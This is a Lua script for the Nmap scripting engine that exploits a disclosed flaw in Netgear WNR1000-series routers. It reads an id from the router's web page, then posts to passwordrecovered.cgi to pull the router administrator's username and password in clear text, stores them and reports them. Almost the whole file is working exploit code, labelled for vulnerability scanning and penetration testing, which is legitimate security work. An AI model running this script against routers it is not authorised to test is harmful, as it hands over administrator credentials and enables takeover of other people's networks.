local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local creds = require "creds"

description = [[
A vulnerability has been discovered in WNR 1000 series that allows an attacker
to retrieve administrator credentials with the router interface.
Tested On Firmware Version(s): V1.0.2.60_60.0.86 (Latest) and V1.0.2.54_60.0.82NA

Vulnerability discovered by c1ph04.
]]

---
-- @usage
-- nmap -sV --script http-vuln-wnr1000-creds <target> -p80
-- @args http-vuln-wnr1000-creds.uri URI path where the passwordrecovered.cgi script can be found. Default: /
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-wnr1000-creds:
-- |   VULNERABLE:
-- |   Netgear WNR1000v3 Credential Harvesting Exploit
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  None, 0-day
-- |     Description:
-- |       A vulnerability has been discovered in WNR 1000 series that allows an attacker
-- |       to retrieve administrator credentials with the router interface.
-- |       Tested On Firmware Version(s): V1.0.2.60_60.0.86 (Latest) and V1.0.2.54_60.0.82NA
-- |     Disclosure date: 26-01-2014
-- |     References:
-- |_      http://packetstormsecurity.com/files/download/124759/netgearpasswd-disclose.zip
--
---

author = {"Paul AMAR <aos.paul@gmail.com>", "Rob Nicholls"}
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}

portrule = shortport.http

-- function to escape specific characters
local escape = function(str) return string.gsub(str, "", "") end

action = function(host, port)
    local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"

    local vuln = {
        title = 'Netgear WNR1000v3 Credential Harvesting Exploit',
        state = vulns.STATE.NOT_VULN, -- default
        description = [[
            A vulnerability has been discovered in WNR 1000 series that allows an attacker
            to retrieve administrator credentials with the router interface.
            Tested On Firmware Version(s): V1.0.2.60_60.0.86 (Latest) and V1.0.2.54_60.0.82NA.
            Vulnerability discovered by c1ph04.
            ]],
        references = {
            'http://c1ph04text.blogspot.dk/2014/01/mitrm-attacks-your-middle-or-mine.html',
        },
        dates = {
            disclosure = {year = '2014', month = '01', day = '26'},
        },
    }

    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

    local detection_session = http.get(host, port, uri)

    if detection_session.status then
      if not detection_session.body then
        stdnse.debug1("No response body")
        return vuln_report:make_output(vuln)
      end
        -- gather the id
        local id_netgear = string.match(escape(detection_session.body), ('(id=%d+)'))

        if id_netgear == nil then
          stdnse.debug1("Unable to obtain the id")
          return vuln_report:make_output(vuln)
        else
            -- send the payload to get username and password
            local payload_session = http.post(host, port, uri .. "passwordrecovered.cgi?" .. id_netgear, { no_cache = true }, nil, "")
            if payload_session then
                local netgear_username = string.match(escape(payload_session.body), 'Router Admin Username</td>.+align="left">(.+)</td>.+Router Admin')
                local netgear_password = string.match(escape(payload_session.body), 'Router Admin Password</td>.+align="left">(.+)</td>.+MNUText')
                if (netgear_username ~= nil and netgear_password ~= nil) then
                  vuln.exploit_results = {
                    ("username: %s"):format(netgear_username),
                    ("password: %s"):format(netgear_password),
                  }
                  local c = creds.Credentials:new(SCRIPT_NAME, host, port)
                  c:add(netgear_username, netgear_password, creds.State.VALID)
                  vuln.state = vulns.STATE.VULN
                else
                    stdnse.debug1("We haven't been able to get username/password")
                end
            end
        end
    end
    return vuln_report:make_output(vuln)
end
